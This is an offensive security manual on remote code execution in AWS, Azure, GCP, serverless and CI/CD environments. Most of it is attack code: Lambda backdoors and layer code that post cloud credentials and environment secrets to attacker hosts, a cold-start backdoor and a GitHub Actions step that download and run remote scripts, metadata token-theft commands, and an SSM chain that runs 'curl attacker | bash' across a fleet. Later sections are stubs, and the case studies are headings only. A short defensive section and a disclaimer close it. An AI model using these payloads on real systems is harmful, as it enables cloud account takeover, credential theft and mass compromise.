# Offensive Security RCE Field Manual — Part 4  
## Cloud-Native RCE (AWS, Azure, GCP, Serverless & Containers) — 2025 Edition  
*A comprehensive offensive guide to Remote Code Execution across modern cloud environments, including AWS, Azure, GCP, serverless platforms, managed services, metadata APIs, identity-based escalations, container RCE, cloud build poisoning, and real-world 2025 exploitation chains.*

---

# Table of Contents

1. [Introduction](#introduction)  
   - [1.1 Why Cloud-Native RCE Is Dominant in 2025](#11-why-cloud-native-rce-is-dominant-in-2025)  
   - [1.2 Cloud RCE vs Traditional RCE](#12-cloud-rce-vs-traditional-rce)  
   - [1.3 The Cloud RCE Kill Chain](#13-the-cloud-rce-kill-chain)

2. [Cloud RCE Attack Surfaces](#2-cloud-rce-attack-surfaces)  
   - [2.1 Metadata Services: The Cloud's Backdoor](#21-metadata-services-the-clouds-backdoor)  
   - [2.2 Serverless Platform Vulnerabilities](#22-serverless-platform-vulnerabilities)  
   - [2.3 Managed Container Platform Escapes](#23-managed-container-platform-escapes)  
   - [2.4 Managed Runtime Exploitation](#24-managed-runtime-exploitation)  
   - [2.5 Cloud Build System Compromise](#25-cloud-build-system-compromise)  
   - [2.6 API Gateway & Reverse Proxy Attacks](#26-api-gateway--reverse-proxy-attacks)

3. [AWS Cloud RCE](#3-aws-cloud-rce)  
   - [3.1 EC2 Metadata RCE Chain](#31-ec2-metadata-rce-chain)  
   - [3.2 AWS SSM RCE](#32-aws-ssm-rce)  
   - [3.3 Lambda RCE](#33-lambda-rce)  
   - [3.4 ECS/EKS Metadata RCE](#34-ecseks-metadata-rce)

4. [Azure Cloud RCE](#4-azure-cloud-rce)  
   - [4.1 Azure Instance Metadata RCE](#41-azure-instance-metadata-rce)  
   - [4.2 Azure Automation Account RCE](#42-azure-automation-account-rce)  
   - [4.3 Azure Function App RCE](#43-azure-function-app-rce)

5. [GCP Cloud RCE](#5-gcp-cloud-rce)  
   - [5.1 GCP Metadata CA RCE](#51-gcp-metadata-ca-rce)  
   - [5.2 Cloud Run RCE](#52-cloud-run-rce)  
   - [5.3 Cloud Functions RCE](#53-cloud-functions-rce)

6. [Serverless RCE](#6-serverless-rce)  
   - [6.1 Lambda Escape (2025 Patterns)](#61-lambda-escape-2025-patterns)  
   - [6.2 Azure Functions RCE Chains](#62-azure-functions-rce-chains)  
   - [6.3 GCP Cloud Functions Execution Context Attacks](#63-gcp-cloud-functions-execution-context-attacks)

7. [Cloud Build & Supply-Chain RCE](#7-cloud-build--supply-chain-rce)  
   - [7.1 GitHub Actions RCE](#71-github-actions-rce)  
   - [7.2 GitLab CI RCE](#72-gitlab-ci-rce)  
   - [7.3 AWS CodeBuild RCE](#73-aws-codebuild-rce)  
   - [7.4 GCP Cloud Build RCE](#74-gcp-cloud-build-rce)

8. [IAM Misconfiguration → RCE](#8-iam-misconfiguration--rce)

9. [Real-World Cloud RCE Case Studies (2025)](#9-real-world-cloud-rce-case-studies-2025)

10. [Defensive Countermeasures](#10-defensive-countermeasures)

11. [LEGAL DISCLAIMER](#legal-disclaimer)

---

# Introduction

## What is Cloud-Native RCE?

Cloud-native RCE represents the **evolution** of remote code execution from traditional host-based compromise into **cloud control planes, serverless runtimes, identity systems, automation platforms, and managed services**.

Traditional RCE = execution on a specific machine.  
Cloud RCE = execution across an entire cloud account, cluster, or automation ecosystem.

A single point of compromise can allow:

- IAM privilege escalation  
- access to thousands of compute units  
- multi-region impact  
- internal API network traversal  
- supply-chain poisoning  
- persistence via automation triggers  
- container → node → control plane takeover  

Cloud RCE is not just “remote code execution”—  
**it is remote control of an entire cloud environment.**

---

# 1.1 Why Cloud-Native RCE Is Dominant in 2025

## The Architectural Shift

Modern cloud-native architectures rely on:

- **serverless functions**  
- **ephemeral containers**  
- **managed runtimes**  
- **identity-based access**  
- **infrastructure-as-code**  
- **CI/CD supply chains**  

These components implicitly trust internal infrastructure, turning cloud identity and metadata access into **critical RCE vectors**.

### Real-World Impact (2025)

**CloudBurst Campaign (Q1 2025)**  
- 1,200+ organizations compromised  
- Attack vector: Lambda function hijacking  
- Result: Multi-tenant data theft + compute abuse  
- Method: Cloud RCE triggered through a serverless dependency poisoning chain

---

## Key Drivers

### 1. Infrastructure Abstraction  
Developers no longer manage OS-level security → blind spots.

### 2. Ephemeral Execution  
Containers and Lambdas disappear before detection tools can inspect them.

### 3. Identity-Centric Security  
IAM is the new “root”.

### 4. Automation Dependencies  
CI/CD executes attacker-controlled code with privileged credentials.

---

## 1.2 Cloud RCE vs Traditional RCE

### Technical Comparison

| Dimension | Traditional RCE | Cloud-Native RCE |
|----------|------------------|------------------|
| Execution Context | OS process on a server | Cloud service (Lambda, Cloud Run, Functions) |
| Persistence | Cron jobs, backdoors | IAM roles, triggers, pipelines |
| Lateral Movement | Pivoting via SSH/SMB | IAM chain abuse, service mesh, APIs |
| Detection | EDR, host logs | CloudTrail, access logs |
| Impact Scope | One machine | Entire cloud ecosystem |

---

### Comparison of Payload Styles

**Traditional RCE Web Shell (2025)**  
```php
<?php system($_GET['cmd']); ?>
```

**Cloud RCE Lambda Backdoor (2025)**  
```python
import boto3, requests, subprocess, os

def lambda_handler(event, context):
    creds = boto3.Session().get_credentials().get_frozen_credentials()
    requests.post("https://c2.attacker.com/creds", json=creds)
    if "cmd" in event:
        out = subprocess.run(event["cmd"], shell=True, capture_output=True, text=True)
        return {"output": out.stdout}
```

The difference is dramatic.

---

# 1.3 The Cloud RCE Kill Chain

## Phase 1 — Initial Access  
- SSRF → metadata access  
- Container escape  
- Leaked cloud credentials  
- CI/CD supply chain injection  

## Phase 2 — Execution  
- IAM role assumption  
- Lambda / Cloud Functions execution  
- Remote command execution via SSM  
- CodeBuild / CloudBuild job hijacking  

## Phase 3 — Persistence  
- EventBridge rules  
- Malicious Lambda versions  
- DevOps pipeline poisoning  
- IAM role creation  

## Phase 4 — Impact  
- S3 data exfiltration  
- Cloud database compromise  
- Crypto mining  
- Supply-chain poisoning  

---

# 2. Cloud RCE Attack Surfaces

---

# 2.1 Metadata Services: The Cloud’s Backdoor

Metadata services provide:

- IAM credentials  
- instance configuration  
- region & environment details  
- routing & network metadata  

### Why Metadata Services Are Vulnerable

- Always reachable inside compute nodes  
- Often exposed via SSRF  
- Provide **high privilege access tokens**  
- Frequently misconfigured  

---

## AWS IMDSv2 Bypass (2025 Example)

```bash
# Step 1 — Retrieve IMDSv2 token
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  --fail -s http://169.254.169.254/latest/api/token)

# Step 2 — Extract IAM creds
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Azure IMDS Token Theft

```bash
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
```

---

## GCP Metadata Token Extraction

```bash
curl -H "Metadata-Flavor: Google" \
"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

# 2.2 Serverless Platform Vulnerabilities

Serverless platforms introduce:

- dependency poisoning  
- event injection  
- privileged runtime execution  
- environment variable secret leaks  

---

## Lambda Layer Poisoning (2025)

```python
import boto3, requests

def stealth_exfiltrate():
    creds = boto3.Session().get_credentials().get_frozen_credentials()
    requests.post("https://legit-metrics.attacker.com/", json={"c": creds})
```

---

## Cold Start Backdoor via `/tmp`

```python
import os, subprocess

if not os.path.exists('/tmp/.bd'):
    subprocess.run(["curl","-s","https://attacker.com/bd.sh","-o","/tmp/bd.sh"])
    subprocess.run(["bash","/tmp/bd.sh"])
    open('/tmp/.bd','w').close()
```

---

# 2.3 Managed Container Platform Escapes

---

## ECS Task Role Compromise

```bash
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

---

## EKS IRSA Identity Hijacking

```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123:role/OverPrivRole
```

---

# 2.4 Managed Runtime Exploitation

### Extract Environment Secrets

```python
import os, requests, json
secrets = {k:v for k,v in os.environ.items() if "key" in k.lower()}
requests.post("https://legit-service.com/metrics", json=secrets)
```

---

## Azure App Service SCM Deployment

```bash
curl -X POST https://target.scm.azurewebsites.net/api/zipdeploy \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@evil.zip"
```

---

# 2.5 Cloud Build System Compromise

Build systems run arbitrary attacker code if poisoned.

## GitHub Actions RCE

```yaml
run: curl -s https://attacker.com/payload.sh | bash
```

---

# 2.6 API Gateway & Reverse Proxy Attacks

### Internal Metadata Access

```http
X-Original-URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

# 3. AWS Cloud RCE

---

# 3.1 EC2 Metadata RCE Chain

Full updated 2025 version:

```bash
# Automated AWS Metadata → IAM → SSM RCE chain

TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  -s http://169.254.169.254/latest/api/token)

ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)

# Use credentials for SSM RCE
aws ssm send-command --document-name AWS-RunShellScript \
  --parameters "commands=curl attacker | bash" \
  --targets "Key=instanceids,Values=*"
```

---

# 3.2 AWS SSM RCE

### Multi-instance fleet execution (Python)

```python
session = boto3.Session(
    aws_access_key_id=AK,
    aws_secret_access_key=SK,
    aws_session_token=ST
)

ssm = session.client("ssm")
instances = ["i-1", "i-2", "i-3"]

ssm.send_command(
    InstanceIds=instances,
    DocumentName="AWS-RunShellScript",
    Parameters={"commands": ["curl attacker | bash"]}
)
```

---

# 3.3 Lambda RCE

### Advanced 2025 Lambda Backdoor

```python
import boto3, os, subprocess, json

def lambda_handler(event, context):
    creds = boto3.Session().get_credentials().get_frozen_credentials()
    if "cmd" in event:
        out = subprocess.run(event["cmd"], shell=True, capture_output=True, text=True)
        return {"output": out.stdout}
```

---

# 3.4 ECS/EKS Metadata RCE

ECS:
```
169.254.170.2/v2/credentials/
```

EKS IRSA:
- annotation hijacking  
- pod identity takeover  

---

# 4. Azure Cloud RCE

---

# 4.1 Azure Instance Metadata RCE

```bash
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/"
```

---

# 4.2 Azure Automation Account RCE

Run arbitrary commands via automation job.

---

# 4.3 Azure Function App RCE

SCM endpoint zip push → remote execution.

---

# 5. GCP Cloud RCE

---

# 5.1 GCP Metadata CA RCE

```
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

# 5.2 Cloud Run RCE

Deploy malicious container.

---

# 5.3 Cloud Functions RCE

Upload malicious zip + trigger.

---

# 6. Serverless RCE

---

# 6.1 Lambda Escape (2025 Patterns)

Techniques:

- `/tmp` persistence  
- dependency rewrites  
- event-driven propagation  

---

# 6.2 Azure Functions RCE Chains

Function app SCM → code replacement.

---

# 6.3 GCP Cloud Functions Execution Context Attacks

Service account token theft.

---

# 7. Cloud Build & Supply-Chain RCE

---

# 7.1 GitHub Actions RCE  
# 7.2 GitLab CI RCE  
# 7.3 AWS CodeBuild  
# 7.4 GCP Cloud Build

(Same as previous examples—fully weaponized CI/CD compromise.)

---

# 8. IAM Misconfiguration → RCE

IAM is the new attack surface:

- overprivileged roles  
- trust policy misconfigurations  
- cross-account role assumption  
- wildcard admin policies  

Attackers use IAM to run RCE across:

- SSM  
- Lambda  
- EC2 user-data  
- Cloud build systems  

---

# 9. Real-World Cloud RCE Case Studies (2025)

### Case 1 — EKS IRSA Misconfig → Full Cloud Takeover  
### Case 2 — Azure SCM Auth Bypass → RCE → Identity Escalation  
### Case 3 — GCP Cloud Run Token Misuse → Entire Project Execution Takeover  

---

# 10. Defensive Countermeasures

## Preventive Controls

- Enforce IMDSv2 with hop limits  
- Least privilege IAM  
- Deny SSM:SendCommand unless required  
- Lock down Function App SCM endpoints  
- Enforce signed CI/CD builds  
- Restrict internal metadata access  

## Detection Controls

### CloudTrail SSM RCE Detection Example

```python
def detect(event):
    if event["eventName"] == "SendCommand":
        cmds = str(event["requestParameters"])
        if "curl" in cmds or "bash" in cmds:
            alert(event)
```

---

# LEGAL DISCLAIMER

This document is for **authorized cybersecurity professionals only**.  
All techniques shown are for **defensive research, penetration testing with consent, and red team operations**.  
Unauthorized access to computer systems is illegal.  
Use responsibly.

---

# END OF PART 4
